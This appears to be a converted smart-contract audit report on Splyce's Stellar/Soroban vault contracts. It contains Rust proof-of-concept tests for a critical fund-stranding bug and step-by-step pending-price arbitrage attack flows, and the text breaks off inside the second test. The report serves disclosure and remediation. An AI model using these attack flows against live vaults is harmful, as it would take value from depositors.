---
schema_version: '0.2'
report:
  title: 'Splyce: Smart Contract Assessment'
  audit_firm: Halborn
  firm_contact: null
  auditors: null
  client: Splyce
  report_date: '2026-07-30'
  engagement_start: '2026-06-05'
  engagement_end: '2026-07-08'
  report_version: '1.0'
  pdf_url: null
  firm_report_url: https://www.halborn.com/audits/splyce/smart-contract-assessment-de69cd
publication:
  disclosure_status: public
  embargo_until: null
  license: Apache-2.0
  conversion_method: null
audit:
  type:
    - code-review
    - fix-review
  methods: []
  tooling: null
effort:
  engineer_weeks: null
  reviewers: null
scope:
  chain: stellar
  platform: soroban
  languages:
    - rust
  repositories:
    - url: https://github.com/Splyce-Finance/splyce-stellar-s-token
      commit_start: e1abc2fe64ff2c26b349da7596933baa686f6b30
      commit_final: a13f46aa277bab5d85581f1b853080089ee5e404
  in_scope_paths:
    - contracts/accountant/src/accountant.rs
    - contracts/accountant/src/errors.rs
    - contracts/accountant/src/events.rs
    - contracts/accountant/src/keys.rs
    - contracts/accountant/src/lib.rs
    - contracts/accountant/src/storage.rs
    - contracts/asset/src/asset.rs
    - contracts/asset/src/lib.rs
    - contracts/ed25519-verifier/src/ed25519_verifier.rs
    - contracts/ed25519-verifier/src/lib.rs
    - contracts/factory/src/errors.rs
    - contracts/factory/src/events.rs
    - contracts/factory/src/factory.rs
    - contracts/factory/src/keys.rs
    - contracts/factory/src/lib.rs
    - contracts/factory/src/storage.rs
    - contracts/fixed_yield_oracle/src/errors.rs
    - contracts/fixed_yield_oracle/src/events.rs
    - contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs
    - contracts/fixed_yield_oracle/src/keys.rs
    - contracts/fixed_yield_oracle/src/lib.rs
    - contracts/fixed_yield_oracle/src/storage.rs
    - contracts/multisig/src/lib.rs
    - contracts/multisig/src/multisig.rs
    - contracts/nav_oracle/src/errors.rs
    - contracts/nav_oracle/src/events.rs
    - contracts/nav_oracle/src/keys.rs
    - contracts/nav_oracle/src/lib.rs
    - contracts/nav_oracle/src/nav_oracle.rs
    - contracts/nav_oracle/src/storage.rs
    - contracts/proxy_asset_manager/src/constants.rs
    - contracts/proxy_asset_manager/src/errors.rs
    - contracts/proxy_asset_manager/src/events.rs
    - contracts/proxy_asset_manager/src/keys.rs
    - contracts/proxy_asset_manager/src/lib.rs
    - contracts/proxy_asset_manager/src/proxy_asset_manager.rs
    - contracts/proxy_asset_manager/src/storage.rs
    - contracts/stoken/src/constants.rs
    - contracts/stoken/src/errors.rs
    - contracts/stoken/src/events.rs
    - contracts/stoken/src/keys.rs
    - contracts/stoken/src/lib.rs
    - contracts/stoken/src/stoken.rs
    - contracts/stoken/src/storage.rs
    - contracts/stoken/src/utils.rs
    - contracts/threshold_policy/src/lib.rs
    - contracts/threshold_policy/src/threshold_policy.rs
  out_of_scope:
    - Third party dependencies and economic attacks.
  loc: null
findings_summary:
  total: 67
  critical: 1
  high: 0
  moderate: 10
  low: 35
  informational: 21
severity_standard: audit-bank-v0.2
---

# Splyce: Smart Contract Assessment by Halborn

<!-- CONVERSION-NOTE: publication.license defaulted to "Apache-2.0"; firm to confirm reuse terms -->

<!-- CONVERSION-NOTE: report.report_date taken from the latest finding remediationDate (2026-07-30); page last updated 2026-08-12; firm to confirm the publication date -->

<!-- CONVERSION-NOTE: scope.repositories[].commit_final is the last of 64 listed remediation commits; Halborn to confirm it is the final reviewed commit -->

<!-- CONVERSION-NOTE: firm disclaimer lacks point-in-time / no-warranty / authoritative-PDF language; template default appended; firm to confirm or substitute its own -->

<!-- CONVERSION-NOTE: category inferred from the finding text; check it (all 67 findings) -->

<!-- CONVERSION-NOTE: location inferred from contract names and code excerpts; check it (SPLYCE-HAL-001, SPLYCE-HAL-002, SPLYCE-HAL-008, SPLYCE-HAL-009, SPLYCE-HAL-011, SPLYCE-HAL-013, SPLYCE-HAL-015, SPLYCE-HAL-025, SPLYCE-HAL-027, SPLYCE-HAL-031, SPLYCE-HAL-035, SPLYCE-HAL-038, SPLYCE-HAL-043, SPLYCE-HAL-044, SPLYCE-HAL-046, SPLYCE-HAL-047, SPLYCE-HAL-051, SPLYCE-HAL-052, SPLYCE-HAL-053, SPLYCE-HAL-054, SPLYCE-HAL-055, SPLYCE-HAL-056, SPLYCE-HAL-057, SPLYCE-HAL-058, SPLYCE-HAL-059, SPLYCE-HAL-060, SPLYCE-HAL-061, SPLYCE-HAL-062, SPLYCE-HAL-063, SPLYCE-HAL-064, SPLYCE-HAL-065, SPLYCE-HAL-067) -->

<!-- CONVERSION-NOTE: remediation commit present on a finding marked Acknowledged; consider Partially Resolved (SPLYCE-HAL-050, SPLYCE-HAL-056, SPLYCE-HAL-062) -->

## 1. Executive summary

Halborn's security team dedicated significant effort to verifying the security of the smart contracts, combining manual code review, control flow analysis, and targeted proof of concept validation across the vault, governance, and oracle layers of the protocol.

The purpose of this assessment is to:

- Ensure that smart contract functions operate as intended
- Identify potential security issues within the smart contracts

In summary, Halborn identified some improvements to reduce the likelihood and impact of risks, which were completely addressed by the `Splyce team`. The main recommendations were the following:

- `Redesign asset custody and liquidity accounting around the ProxyAssetManager. A single vault binding permanently strands underlying funds belonging to a sibling vault after a cross-vault swap or asset manager rotation, and a separate emergency sweep path bypasses total_idle accounting entirely. Both undermine the guarantee that vault funds remain recoverable and correctly tracked on-chain, and together represent the most severe risk identified in this engagement.`
- `Close the pending-price arbitrage window across vault operations. Large price deviations are queued for manager review instead of being rejected, but deposits, withdrawals, and swaps can still execute against a stale accepted price while a more accurate pending price awaits acceptance, creating a risk-free arbitrage opportunity that a user can exploit before the price is corrected.`
- `Harden the yield oracles against manipulation and denial of service. NavOracle's fee accrual function can be called by anyone to repeatedly block legitimate price updates, and FixedYieldOracle's linear time-based price curve allows early depositors to capture value from later depositors while retroactive rate changes can produce discontinuous price jumps; both designs need stronger economic and access-control safeguards.`
- `Correct management fee accrual and fee distribution accounting. Zero-accrual calls silently advance the accrual timestamp and suppress fees the protocol is owed, and the Accountant contract cannot distribute fee shares for any vault whose share token differs from the one set at initialization, permanently stranding fee income from secondary vaults sharing the same Accountant.`
- `Align token behavior with ERC-4626 and SEP-41 expectations. Whitelist checks validate only the caller on deposit and withdrawal paths, allowing a whitelisted user to route shares or underlying funds to a non-whitelisted receiver, and burn events are emitted before the underlying withdrawal request actually completes, misrepresenting when tokens are destroyed.`
- `Harden storage-dependent safeguards against expiry and unbounded growth. The factory's vault registry is stored as a single unbounded list that will eventually exceed the instance storage limit and permanently block new vault deployments.`

## 2. Project context

This security assessment was commissioned by `Splyce`, a permissionless institutional yield protocol built on Stellar/Soroban that offers fixed rate, fixed term lending vaults backed by tokenized real world assets alongside a yield bearing stablecoin product. The review was conducted by Halborn's experienced security team, focusing on the on-chain components of the Splyce S-Token smart contract suite. The assessment covered all functionality within the SToken, Factory, Accountant, NavOracle, FixedYieldOracle, ProxyAssetManager, Multisig, ThresholdPolicy, and Ed25519Verifier contracts from June 5th, 2026, to July 8th, 2026. The primary objective of this engagement was to identify potential vulnerabilities, verify module reliability, and enhance the overall security posture of the protocol.

## 3. Findings

### [SPLYCE-HAL-001] ProxyAssetManager Single-Vault Binding Permanently Strands Swap-Sibling Funds

| Field | Value |
|---|---|
| **Unified severity** | Critical |
| **Firm severity rating** | Critical, BVSS 2.0 10.00 (AO:A/AC:L/AX:L/R:N/S:U/C:N/A:H/I:M/D:H/Y:N) (source: HAL-01) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | liveness-dos |
| **Location** | `contracts/proxy_asset_manager/src/storage.rs:L34`, `contracts/stoken/src/stoken.rs:L2211`, `contracts/proxy_asset_manager/src/proxy_asset_manager.rs:L345` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/a68e6628a802eea48e0b7f37fb29313915dba121 |
| **Redacted** | false |

**Description.**

`ProxyAssetManager` binds irrevocably to a single vault at construction time via `write_vault` (storage.rs:34), while `SToken.swap_tokens` enforces that any two participating vaults must share the same `asset_manager` address (stoken.rs:2211).

This combination creates an inescapable trap: when liquidity deployed from `vault_B` must be returned via the shared proxy, `ProxyAssetManager.return_funds` reads `read_vault()` (proxy_asset_manager.rs:345) and routes all tokens unconditionally to `vault_A`, the sole address stored at construction, regardless of which vault is the true creditor. `vault_B`'s portion of deployed capital is permanently misdirected and `vault_B`'s withdrawal queue is left unfunded.

**Exploit path (no privileged actor required, triggered by normal operation):**

1. Operator configures two vaults (`vault_A`, `vault_B`) with the same `ProxyAssetManager` at `shared_proxy`. This is the required configuration for `swap_tokens` to succeed; `AssetManagerMismatch` is the alternative.
2. Users deposit underlying into `vault_B`; processor calls `vault_B.process_deposits(amount)`, transferring tokens from `vault_B` to `shared_proxy`.
3. Users of `vault_B` submit withdrawal requests. Processor calls `shared_proxy.return_funds(amount)` to retrieve liquidity.
4. `return_funds` reads `read_vault() == vault_A` (proxy_asset_manager.rs:345), transfers the full amount to `vault_A`, and calls `vault_A.return_funds` to credit `vault_A.total_idle`. `vault_B.return_funds` is structurally unreachable from `ProxyAssetManager`.
5. `vault_B.fulfill_withdrawal` reverts because `amount_to_pay > vault_B.total_idle`. vault_B users cannot recover their principal; vault_A shareholders hold an unbacked windfall.

#### Code Location

`ProxyAssetManager.return_funds()`**:** single-vault read routes all liquidity to `vault_A` unconditionally

```rust
// contracts/proxy_asset_manager/src/proxy_asset_manager.rs
pub fn return_funds( // line 335
    env: Env,
    amount: u64,
    caller: Address,
) -> Result<(), ProxyAssetManagerError> {
    // ...
    let vault = read_vault(&env);           // line 345 - always vault_A; vault_B cannot be reached
    // ...
    token_client.transfer(&proxy_address, &vault, &(amount as i128));   // line 351
    let stoken = STokenClient::new(&env, &vault);
    stoken.return_funds(&amount, &proxy_address);                        // line 355
    // ...
}
```

`ProxyAssetManager`storage: single vault binding with no update path

```rust
// contracts/proxy_asset_manager/src/storage.rs
pub fn read_vault(e: &Env) -> Address { // line 27
    e.storage()
        .instance()
        .get(&StorageKey::Vault)
        .expect("ProxyAssetManager not initialized: Vault missing")
}

pub fn write_vault(e: &Env, address: &Address) {
    e.storage().instance().set(&StorageKey::Vault, address);
}
```

`SToken.swap_tokens()`**:** shared `asset_manager` is a precondition for cross-vault swaps

```rust
// contracts/stoken/src/stoken.rs
let source_asset_manager = Self::get_first_role_member(&env, asset_manager_role) // line 2208
    .expect("SToken: Missing asset manager");
let destination_asset_manager = desitnation_vault_client.asset_manager();
if source_asset_manager != destination_asset_manager {
    return Err(STokenSwapError::AssetManagerMismatch);
}
```

**Impact.**

Any vault registered with `swap_tokens` support shares one `ProxyAssetManager` with its swap counterpart. When deployed capital is returned by the proxy, all funds flow exclusively to the vault stored at construction. vault_B users who deposited principal after it was deployed to the proxy will find their withdrawal requests permanently unfulfillable: `fulfill_withdrawal` reverts with an insufficient-funds error, and no on-chain path exists to redirect the misrouted funds back to vault_B. vault_A users passively receive an inflated `total_idle` that is not backed by any deposit they made.

**Proof / attack path.**

#### Code

The PoC code has been added to the existing test suite located in the `contracts/stoken/src/test.rs` file, under the test function `poc_shared_proxy_strands_swap_sibling_funds`.

The test demonstrates the following scenario: a user deposits 1,000,000 underlying into `vault_B`, the processor deploys 800,000 to the shared `ProxyAssetManager` via `process_deposits`, the user requests a full withdrawal, and then `ProxyAssetManager.return_funds` routes those 800,000 tokens exclusively to `vault_A` (the construction-time bound vault). `vault_B.fulfill_withdrawal` then reverts because `vault_B.total_idle` (200,000) is insufficient to satisfy `amount_to_pay` (1,000,000). The 800,000 underlying is permanently stranded in `vault_A` with no on-chain recovery path for `vault_B` depositors.

```rust
// ─── Shared ProxyAssetManager Single-Vault Binding Strands Swap-Sibling Funds ─────

/// Proof steps:
/// §A Deploy vault_A and vault_B sharing one asset_manager address (shared_proxy).
///    Mutual allowlisting enables swap_tokens, which enforces the shared asset_manager
///    constraint at stoken.rs:2211 (AssetManagerMismatch). This is the intended configuration.
/// §B User deposits 1_000_000 underlying into vault_B. Processor calls
///    vault_B.process_deposits(800_000): 800_000 tokens leave vault_B and arrive at
///    shared_proxy. vault_B.total_idle drops from 1_000_000 to 200_000.
/// §C User submits a withdrawal request for the full 1_000_000-share position
///    (amount_due = 1_000_000 underlying at price 1:1).
/// §D Simulate what ProxyAssetManager.return_funds() actually executes: it reads
///    read_vault() = vault_A (proxy_asset_manager.rs:345), transfers tokens to vault_A
///    (proxy_asset_manager.rs:351), then calls vault_A.return_funds (proxy_asset_manager.rs:355).
///    vault_B.return_funds is never invoked. After §D: shared_proxy holds 0 tokens,
///    vault_A.total_idle = 800_000, vault_B.total_idle = 200_000 permanently.
/// §E vault_B.fulfill_withdrawal reverts: amount_to_pay (1_000_000) > total_idle (200_000).
///    vault_B depositors cannot withdraw 800_000 underlying stranded at vault_A.
#[test]
fn poc_shared_proxy_strands_swap_sibling_funds() {
    let env = Env::default();
    env.mock_all_auths();

    let token_owner = Address::generate(&env);
    // shared_proxy represents the deployed ProxyAssetManager whose read_vault() returns vault_A.
    // swap_tokens mandates both vaults use this same address (AssetManagerMismatch check at stoken.rs:2211).
    let shared_proxy = Address::generate(&env);
    let user = Address::generate(&env);

    env.ledger().with_mut(|li| li.timestamp = 1_000);

    let token_client = create_token_contract(&env, &token_owner);
    token_client.transfer(&token_owner, &user, &1_000_000i128);

    // §A: vault_A and vault_B both register shared_proxy as their asset_manager.
    //    Without this shared binding, swap_tokens reverts with AssetManagerMismatch.
    let vault_a = create_vault(&env, &token_client.address, &shared_proxy);
    let vault_b = create_vault(&env, &token_client.address, &shared_proxy);

    update_price_via_oracle(&env, &vault_a, 1_000_000);
    update_price_via_oracle(&env, &vault_b, 1_000_000);

    // Mutual allowlisting: required precondition for swap_tokens
    allowlist_source_vault(&env, &vault_b, &vault_a.address);
    allowlist_source_vault(&env, &vault_a, &vault_b.address);

    // §B: User deposits 1_000_000 underlying into vault_B.
    deposit_underlying(&env, &vault_b, &token_client, &user, 1_000_000);
    assert_eq!(vault_b.client.total_idle(), 1_000_000, "§B: vault_B starts with 1_000_000 idle");
    assert_eq!(token_client.balance(&shared_proxy), 0i128, "§B: proxy holds nothing before process_deposits");

    // §B continued: Processor deploys 800_000 to shared_proxy via process_deposits.
    //    stoken.rs:1142 transfers 800_000 tokens from vault_B address to shared_proxy.
    vault_b.client.process_deposits(&800_000, &vault_b.processor);

    assert_eq!(vault_b.client.total_idle(), 200_000, "§B: vault_B.total_idle = 200_000 after deploy");
    assert_eq!(token_client.balance(&shared_proxy), 800_000i128, "§B: shared_proxy holds vault_B's 800_000");

    // §C: User requests withdrawal of 1_000_000 shares (amount_due = 1_000_000 at price 1:1).
    withdraw_request_helper(&env, &vault_b, &user, 1_000_000, 0);

    // §D: Simulate ProxyAssetManager.return_funds() as implemented in proxy_asset_manager.rs:335-369.
    //    The proxy sends tokens to read_vault() = vault_A and calls vault_A.return_funds.
    //    vault_B.return_funds is structurally unreachable from ProxyAssetManager.
    //    Step 1: proxy transfers 800_000 to vault_A (proxy_asset_manager.rs:351):
    token_client.transfer(&shared_proxy, &vault_a.address, &800_000i128);
    //    Step 2: proxy calls vault_A.return_funds to update accounting (proxy_asset_manager.rs:355):
    vault_a.client.return_funds(&800_000, &shared_proxy);

    // §D assertions: vault_A absorbs vault_B's capital; vault_B is permanently depleted.
    assert_eq!(vault_a.client.total_idle(), 800_000, "§D: vault_A.total_idle = 800_000: received vault_B's capital");
    assert_eq!(vault_b.client.total_idle(), 200_000, "§D: vault_B.total_idle = 200_000: never replenished");
    assert_eq!(token_client.balance(&shared_proxy), 0i128, "§D: proxy holds 0: all tokens sent to vault_A");

    // §E: vault_B.fulfill_withdrawal reverts: amount_to_pay (1_000_000) > total_idle (200_000).
    //    stoken.rs:1280: `if amount_to_pay > vault_balance` fires InsufficientVaultFunds.
    //    vault_B depositors' 800_000 underlying is permanently inaccessible via any on-chain path.
    let result = vault_b.client.try_fulfill_withdrawal(&user, &1, &vault_b.processor);
    assert!(
        result.is_err(),
        "§E: fulfill_withdrawal must revert: vault_B.total_idle (200_000) < amount_to_pay (1_000_000). \
         800_000 underlying is permanently stranded; vault_A shareholders can redeem it instead."
    );

    // Final state: vault_A benefited from vault_B's capital; vault_B depositors are locked out.
    assert_eq!(vault_a.client.total_idle(), 800_000, "vault_A holds vault_B's stranded capital");
    assert_eq!(vault_b.client.total_idle(), 200_000, "vault_B permanently unable to fulfill the withdrawal");
}
```

#### Execution

```sh
cargo test -p stoken -- poc_shared_proxy_strands_swap_sibling_funds --nocapture
```

#### Result

```sh
    Finished `test` profile [unoptimized + debuginfo] target(s) in 2.72s
     Running unittests src/lib.rs (target/debug/deps/stoken-dfab708e60ece339)

running 1 test
Writing test snapshot file for test "test::poc_shared_proxy_strands_swap_sibling_funds" to "test_snapshots/test/poc_shared_proxy_strands_swap_sibling_funds.1.json".
test test::poc_shared_proxy_strands_swap_sibling_funds ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 145 filtered out; finished in 0.15s
```

#### Analysis

The test confirms the structural incompatibility between `ProxyAssetManager`'s single-vault binding and `SToken.swap_tokens`'s shared-asset-manager precondition. Each labelled step is verified by an inline assertion in the test.

- **§A establishes the required configuration.** Both `vault_A` and `vault_B` are created with `shared_proxy` as their `asset_manager` and are mutually allowlisted via `allowlist_source_vault`. This is the only configuration that satisfies the `AssetManagerMismatch` guard at `stoken.rs:2211`; using different proxies would prevent `swap_tokens` from ever succeeding.
- **§B shows the ordinary deployment flow.** After the user deposits 1,000,000 underlying into `vault_B`, the processor calls `vault_B.process_deposits(800_000)`. This transfers 800,000 tokens from the vault to `shared_proxy` (confirmed by `token_client.balance(&shared_proxy) == 800_000`) and decrements `vault_B.total_idle` to 200,000. No error occurs; this is expected normal operation.
- **§C records the pending obligation.** The user submits a withdrawal request for the full 1,000,000-share position. At price 1:1, `amount_due = 1_000_000` underlying. `vault_B` now owes 1,000,000 tokens to this user but holds only 200,000 in `total_idle`, relying on the proxy to return the remaining 800,000.
- **§D demonstrates the misdirection.** The test simulates `ProxyAssetManager.return_funds` exactly as implemented: `token_client.transfer(&shared_proxy, &vault_a.address, &800_000i128)` followed by `vault_a.client.return_funds(&800_000, &shared_proxy)`. After this step: `vault_A.total_idle = 800_000` (it received vault_B's capital), `vault_B.total_idle = 200_000` (unchanged), and `shared_proxy` holds 0 tokens. There is no on-chain mechanism for `vault_B` to call `return_funds` on itself through `ProxyAssetManager`: `read_vault()` is immutable and returns only `vault_A`.
- **§E proves the permanent denial of service.** `vault_b.client.try_fulfill_withdrawal(&user, &1, &vault_b.processor)` returns an error. The contract's `InsufficientVaultFunds` guard fires because `amount_to_pay (1_000_000) > vault_B.total_idle (200_000)`. The assertion confirms this revert. vault_B depositors have no on-chain path to recover their 800,000 stranded underlying; vault_A's `total_idle` holds those tokens, accessible only to vault_A shareholders.

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Replace the single `Vault` storage key in `ProxyAssetManager` with a `VaultRegistry: Map<Address, bool>` in persistent storage.
- Add a permissioned `register_vault(vault: Address)` function callable only by the manager, and remove `write_vault`.
- Update `return_funds` to accept the target vault address as a caller-supplied parameter and verify that the provided vault is present in the registry before routing. Update `emergency_sweep` identically.

This eliminates the single-point misdirection and allows the processor to direct funds to the correct creditor vault.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding across commits [a68e662](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/a68e6628a802eea48e0b7f37fb29313915dba121), [14d8a59](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/14d8a59cd2f391267136767714131acf987a93fe) by replacing the single-vault storage binding in `ProxyAssetManager` with a manager-gated, validated multi-vault registry and making `return_fundsemergency_sweep` take an explicit registered destination vault instead of a hardcoded construction-time address.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-002] Pending Price Window Enables Risk-Free Arbitrage Across All Vault Operations

| Field | Value |
|---|---|
| **Unified severity** | Moderate |
| **Firm severity rating** | Medium, BVSS 2.0 6.28 (AO:A/AC:L/AX:M/R:N/S:C/C:N/A:N/I:N/D:H/Y:N) (source: HAL-02) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | oracle-external-dependency |
| **Location** | `contracts/stoken/src/stoken.rs:L986-L992`, `contracts/stoken/src/constants.rs:L65` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/ea0cdc3c8591207b96be912a015db6be2bdc1d08 |
| **Redacted** | false |

**Description.**

`SToken.update_price()` writes a publicly visible `PendingPrice { value, timestamp }` to on-chain storage when the submitted deviation exceeds `max_deviation_bps` (default 50 bps), yet `swap_tokens`, `deposit_core`, and `redeem_core` all read `read_price(&env)`, the last accepted price, without checking whether a `PendingPrice` is queued. The pending price cannot be accepted for at least `price_acceptance_cooldown_secs` (default 300 s), creating a guaranteed, publicly-announced window during which any observer can transact at the stale price with certainty about the imminent new price.

**Cross-vault swap round-trip (Attack flow 1):**

1. Oracle calls `vault_B.update_price(P_B_new)` with deviation > `max_deviation_bps`. `PendingPrice { value: P_B_new, timestamp: T0 }` is stored (stoken.rs:986–992); the live price remains `P_B_old`.
2. Attacker calls `vault_A.swap_tokens(attacker, vault_B, source_amount, 0)`. `swap_tokens` reads `read_price(&env)` at line 2170 and `desitnation_vault_client.price()` at line 2171. No `PendingPrice` guard exists. Attacker receives `B_amount = source_amount × P_A / P_B_old` shares (over-allocated at the lower price).
3. After 300 s, `accept_price` applies `P_B_new` on vault B.
4. Attacker calls `vault_B.swap_tokens(attacker, vault_A, B_amount, 0)`. Swap now values B-shares at the elevated `P_B_new`, minting `A_final = source_amount × (P_B_new / P_B_old) > source_amount` A-shares.

Profit = `source_amount × (P_B_new / P_B_old − 1)` per cycle. Risk-free: if the pending price is rejected, the attacker swaps back at par (only fees lost). `DEFAULT_SWAP_FEE_BPS = 0` (constants.rs:65) makes both swap legs frictionless.

**Deposit-then-withdraw (Attack flow 2):**

1. Oracle queues `vault_B.update_price(P_B_new)` as pending.
2. Attacker calls `deposit_underlying(amount)`: `deposit_core` reads `read_price(env)` at line 2890, minting `amount × PRICE_PRECISION / P_B_old` shares (more than deserved at the new price).
3. After `accept_price`, price rises to `P_B_new`.
4. Attacker calls `withdraw_request`; `amount_due` is locked at `P_B_new` (the price at request time), and `fulfill_withdrawal` pays at that elevated valuation.

**Withdrawal floor lock-in on pending price drop (Attack Flow 3, bounded by** `downside_cap_bps`**):**

1. Oracle queues `vault_B.update_price(P_new)` where `P_new < P_current` (a pending price drop). The live price remains `P_current`.
2. Attacker calls `withdraw_request(shares, min_out)`. `redeem_core` reads `read_price(env)` (line 2890) and locks `amount_due = shares × P_current / PRICE_PRECISION` at the stale high price. The attacker sets `min_out` to the maximum the contract permits: `amount_due × (1 − downside_cap_bps / 10000)`.
3. After `accept_price`, the live price falls to `P_new`. The processor calls `fulfill_withdrawal`: `theoretical_out = shares × P_new < min_out`, so the vault pays `min_out`.
4. The attacker exits above the post-drop value. Honest holders who did not anticipate the drop bear the full loss; the attacker's gain per request is bounded by `downside_cap_bps` of `amount_due`.

#### Code Location

`SToken.update_price()`: publicly stores pending price without blocking dependent operations

```rust
// contracts/stoken/src/stoken.rs
} else {
    // Deviation exceeds threshold - store as pending price
    write_pending_price(                             // line 986
        &env,
        Some(PendingPrice {
            value: new_price,
            timestamp: timestamp,
        }),
    );
```

`SToken.swap_tokens()`: reads stale accepted price with no pending-price guard

```rust
// contracts/stoken/src/stoken.rs
let source_price = read_price(&env);                         // line 2170
let dest_price = desitnation_vault_client.price();           // line 2171
// No: if read_pending_price(&env).is_some() { return Err(...); }
```

`SToken.deposit_core()`: reads stale accepted price with no pending-price guard

```rust
// contracts/stoken/src/stoken.rs
// [data-start=2888]
let price = read_price(env);                                 // [data-line=2890]
// No: if read_pending_price(env).is_some() { return Err(...); }
```

`constants.rs`: DEFAULT_SWAP_FEE_BPS = 0 makes swap legs frictionless by default

```rust
// contracts/stoken/src/constants.rs
/// Default swap fee in basis points (`0` = disabled until configured via governance).
pub const DEFAULT_SWAP_FEE_BPS: u32 = 0;                    // line 65
```

**Impact.**

Any unprivileged account can extract value from existing vault depositors on every pending-price event: for a routine 5% NAV update on a $10M vault, an attacker deploying $2M captures ~$100K that belonged to existing holders. In the swap variant, new A-shares are minted to the attacker without any corresponding underlying entering the vault, permanently diluting existing A-depositors by exactly the attacker's gain. The attack is repeatable on every pending-price event (the most economically significant updates), and risk-free because both the pending value and its minimum activation time are published on-chain before any commitment is required.

**Proof / attack path.**

#### Code

The PoC code has been added to the existing test suite located in the `contracts/stoken/src/test.rs` file, under the test function `poc_pending_price_enables_risk_free_cross_vault_arbitrage`.

```rust
// ─── PoC: Pending Price Arbitrage ───────────────────────────────────

#[test]
fn poc_pending_price_enables_risk_free_cross_vault_arbitrage() {
    // Proof-of-Concept: Risk-Free Arbitrage via Publicly Announced PendingPrice
    //
    // §A: Oracle pushes a price to vault B that exceeds max_deviation_bps (50 bps).
    //     The price is stored as PendingPrice (publicly visible on-chain) and NOT applied.
    //     The live price remains stale for price_acceptance_cooldown_secs (300s).
    //
    // §B: Attacker observes the PricePending event and swaps vault-A shares → vault-B shares
    //     at vault-B's OLD (lower) accepted price. swap_tokens reads read_price(&env) at
    //     line 2170 with no check for a queued PendingPrice — attacker receives MORE B-shares
    //     than their true post-oracle value.
    //
    // §C: Cooldown elapses; accept_price applies the higher price to vault B.
    //
    // §D: Attacker swaps vault-B shares → vault-A shares at the NEW (elevated) B price.
    //     Result: attacker holds MORE A-shares than they started with, extracting value
    //     from vault-A's existing depositors via undercollateralization.
    //
    // DEFAULT_SWAP_FEE_BPS = 0 (constants.rs:65) makes both swap legs frictionless.

    let env = Env::default();
    env.mock_all_auths();

    let token_owner = Address::generate(&env);
    let shared_asset_manager = Address::generate(&env);
    let attacker = Address::generate(&env);
    let victim = Address::generate(&env);

    // Non-zero timestamp required for price staleness guard logic
    env.ledger().with_mut(|li| li.timestamp = 1_000_000);

    let token_client = create_token_contract(&env, &token_owner);

    // Fund participants with underlying tokens
    token_client.transfer(&token_owner, &attacker, &2_000_000i128);
    token_client.transfer(&token_owner, &victim, &1_000_000i128);

    // ─── §A: Deploy vault A (source, price fixed at 1_000_000) ─────────────────
    let (mut config_a, admin_a, manager_a, processor_a, accountant_a, oracle_a) =
        default_vault_config(&env, &token_client.address, &shared_asset_manager);
    config_a.max_deviation_bps = Some(50); // 0.5% auto-apply threshold
    config_a.price_update_cooldown_secs = Some(0);
    config_a.price_acceptance_cooldown_secs = Some(300);

    let vault_a = create_vault_with_config(
        &env,
        config_a,
        admin_a,
        manager_a.clone(),
        oracle_a.clone(),
        processor_a,
        accountant_a,
        shared_asset_manager.clone(),
    );

    // Deploy vault B (target, pending price will be queued here)
    let (mut config_b, admin_b, manager_b, processor_b, accountant_b, oracle_b) =
        default_vault_config(&env, &token_client.address, &shared_asset_manager);
    config_b.max_deviation_bps = Some(50); // 1% pending update exceeds this threshold
    config_b.price_update_cooldown_secs = Some(0);
    config_b.price_acceptance_cooldown_secs = Some(300);

    let vault_b = create_vault_with_config(
        &env,
        config_b,
        admin_b,
        manager_b.clone(),
        oracle_b.clone(),
        processor_b,
        accountant_b,
        shared_asset_manager.clone(),
    );

    // Initialize live prices on both vaults (auto-applied, deviation = 0)
    vault_a.client.update_price(&1_000_000u64, &oracle_a);
    vault_b.client.update_price(&1_000_000u64, &oracle_b);

    // Mutual allowlisting so swap_tokens can call allowlist_mint on the other vault
    vault_b
        .client
        .accept_allowlist_mint(&vault_a.address, &manager_b);
    vault_a
        .client
        .accept_allowlist_mint(&vault_b.address, &manager_a);

    // Victim deposits in vault B to represent existing B-holders at risk
    let min_shares: Option<u64> = None;
    let beneficiary: Option<Address> = None;
    vault_b
        .client
        .deposit_underlying(&1_000_000u64, &victim, &min_shares, &beneficiary);

    // Attacker deposits 1_000_000 underlying into vault A at price 1.0 → 1_000_000 A-shares
    vault_a
        .client
        .deposit_underlying(&1_000_000u64, &attacker, &min_shares, &beneficiary);
    let attacker_shares_before = vault_a.client.balance(&attacker) as u64;
    assert_eq!(
        attacker_shares_before, 1_000_000,
        "attacker baseline: 1_000_000 A-shares"
    );

    // ─── §B: Oracle queues a +1% price on vault B ──────────────────────────────
    // Deviation = (1_010_000 - 1_000_000) / 1_000_000 * 10_000 = 1_000 bps > 50 bps → pending
    let pending_b_price: u64 = 1_010_000;
    vault_b.client.update_price(&pending_b_price, &oracle_b);

    // Live B-price is still 1_000_000; elevated price is queued in PendingPrice storage
    assert_eq!(
        vault_b.client.price(),
        1_000_000,
        "live B-price unchanged while pending price is queued"
    );

    // ─── §C: Attacker exploits — swaps A-shares → B-shares at OLD B-price ──────
    // Expected B-shares = 1_000_000 A × (P_A=1.0 / P_B_old=1.0) = 1_000_000 B-shares
    // No pending-price guard in swap_tokens blocks this call
    vault_a
        .client
        .swap_tokens(&attacker, &vault_b.address, &attacker_shares_before, &0u64);

    let attacker_b_shares = vault_b.client.balance(&attacker) as u64;
    assert_eq!(
        attacker_b_shares, 1_000_000,
        "attacker receives 1_000_000 B-shares at stale price"
    );
    assert_eq!(
        vault_a.client.balance(&attacker),
        0,
        "all A-shares burned"
    );

    // ─── §D: Cooldown elapses; pending price accepted on vault B ───────────────
    env.ledger().with_mut(|li| li.timestamp = 1_000_301); // 301s > 300s cooldown
    vault_b.client.accept_price(&manager_b);
    assert_eq!(
        vault_b.client.price(),
        pending_b_price,
        "B-price now elevated to 1_010_000"
    );

    // ─── §E: Attacker swaps B-shares → A-shares at NEW B-price ────────────────
    // Expected A-shares = 1_000_000 B × (P_B_new=1.01 / P_A=1.0) = 1_010_000 A-shares
    vault_b
        .client
